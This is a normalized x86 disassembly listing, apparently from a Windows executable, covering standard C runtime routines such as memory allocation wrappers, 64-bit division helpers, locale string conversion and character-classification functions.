mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_42acad
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_43722f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_429a97
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_437263
push 0xc
push r--data
call sub_4278c0
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
setne al
test eax eax
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0xc ] esi
push esi
call sub_429f60
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_437193
mov edi eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
push esi
push edi
call sub_43722f
add esp 0x1c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4372e3
mov eax [ ebp - 0x1c ]
call sub_427905
retn
sub_4373aa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_42578a
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4373db
push 0x10
push r--data
call sub_4278c0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43746e
mov eax [ ebp - 0x1c ]
call sub_427905
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_43cc9d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_42578a
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_437480
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_437515
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_4268f3
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_426a24
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_437597
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_424f00
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_42578a
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_426a24
pop ecx
call sub_4268f3
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_4268f3
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4268b1
pop ecx
mov [ esi ] eax
push esi
call sub_426a24
pop ecx
test eax eax
je r-xdata
call sub_4268f3
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4268b1
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_437644
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_437597
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_42adde
pop ecx
mov ebx eax
call sub_4268f3
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_4338e0
add esp 0xc
sub_4376b2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_42970c
mov eax esi
jmp r-xdata
sub_43777d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_42578a
pop ecx
sub_43779d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4247dc
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_43777d
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_424f00
pop ecx
cmp eax esi
je r-xdata
call sub_43cd20
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_437877
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_43779d
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4378ba
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_4378d8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4247dc
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_43777d
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_424f00
pop ecx
cmp eax ebx
je r-xdata
call sub_43cd20
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_43777d
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_424f00
pop ecx
cmp eax ebx
je r-xdata
call sub_43cd20
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_437abf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4378d8
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_437b05
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4247dc
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_4338e0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_43777d
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_424f00
pop ecx
cmp eax ebx
je r-xdata
call sub_43cd20
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_437bec
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_437b05
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_437c30
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437c50
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4247dc
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_437c95
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_437c95
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_437c50
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_437d45
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_437d64
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_437d3c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_437d45
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_437de0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_437e0d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
lea eax [ ebp - 0x10 ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_437e63
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_437e0d
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x103
pop ebp
retn
sub_437e93
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_437ee4
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_437e93
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_437f12
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_437f63
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_437f12
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_437f91
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_437fe2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_437f91
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_438010
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_438066
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_438010
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_438096
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4380e7
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_438096
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_438115
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x10
lea eax [ ebp - 0x10 ]
push eax
push 0x10
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_438166
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_438115
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x10
pop ebp
retn
sub_438194
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4381ea
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_438194
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_43821a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x157
lea eax [ ebp - 0x10 ]
push eax
push 0x157
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_438270
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
